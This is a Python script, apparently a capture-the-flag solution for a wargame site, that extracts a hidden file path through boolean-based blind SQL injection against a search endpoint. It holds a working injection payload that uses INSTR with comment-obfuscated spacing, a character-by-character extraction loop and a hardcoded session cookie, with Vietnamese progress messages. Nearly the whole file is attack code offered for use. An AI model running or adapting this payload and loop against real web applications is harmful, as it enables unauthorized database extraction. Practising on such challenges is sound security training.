import requests
import string
import time
url = "https://dlp.wargame.vn/api/search.php"
cookies = {'PHPSESSID': '81f3c2c9fb4fe7a49a64e44b3d707b07'}
path_to_flag = ""
# initial sliding window (use this instead of mutating prefix itself)
window = "flag"   # your original prefix
# if you meant "flag-" use "flag-" instead
# current_pos left in code for compatibility, but we will use INSTR(... )>0 (recommended)
current_pos = 15
# try a hex-like charset (faster) or keep your original
charset = "abcdef0123456789_-/."
print(f"[*] Bắt đầu brute-force...")
print(f"[*] Window ban đầu: {window}")
print(f"[*] Vị trí bắt đầu (x): {current_pos}\n")
# choose how many chars you want to recover
for i in range(40):
    found = False
    # use window_before so y length stays bounded
    window_before = window
    for char in charset:
        # y is sliding window + candidate char (bounded length)
        y = window_before + char
        # recommended: use >0 (exists) rather than >current_pos; if you insist on >current_pos, keep as before
        raw_payload = f"'&&(INSTR((SELECT/**/storage_path/**/FROM/**/attachments/**/LIMIT/**/1),'{y}')>0)#"
        print(f"[DEBUG] Testing: y='{y}', payload_len={len(raw_payload)}", end='')
        try:
            r = requests.get(url, params={'q': raw_payload}, cookies=cookies, timeout=8)
            try:
                result = r.json()
            except Exception:
                result = {}
            ok = bool(result.get('ok'))
            if ok:
                # append found char to full recovered tail
                path_to_flag += char
                print(" ✓")
                print(f"[+] Tìm thấy: {path_to_flag}")
                # slide the window: drop first char, append found char
                if len(window) > 0:
                    window = (window + char)[1:]
                else:
                    window = char
                current_pos += 1
                print(f"[*] Cập nhật window='{window}', x={current_pos}\n")
                found = True
                break
            else:
                print(" ✗")
        except Exception as e:
            print(f" ERROR: {e}")
        time.sleep(0.08)
    if not found:
        print(f"\n[*] Không tìm thấy ký tự tiếp theo trong charset này.")
        y_txt = window_before + ".txt"
        raw_payload_txt = f"'&&(INSTR((SELECT/**/storage_path/**/FROM/**/attachments/**/LIMIT/**/1),'{y_txt}')>0)#"
        try:
            r = requests.get(url, params={'q': raw_payload_txt}, cookies=cookies, timeout=8)
            try:
                res = r.json()
            except Exception:
                res = {}
            if res.get('ok'):
                path_to_flag += ".txt"
                print(f"[+] Hoàn thành: {path_to_flag}")
            else:
                print("[*] .txt không tồn tại (theo thử window).")
        except Exception as e:
            print(f"[!] Error checking .txt: {e}")
        break
print("\n" + "="*60)
print(f"[RESULT] Path tìm được (tail): {path_to_flag}")
print(f"[RESULT] Full path guess: {window_before + path_to_flag}")  
print("="*60 + "\n")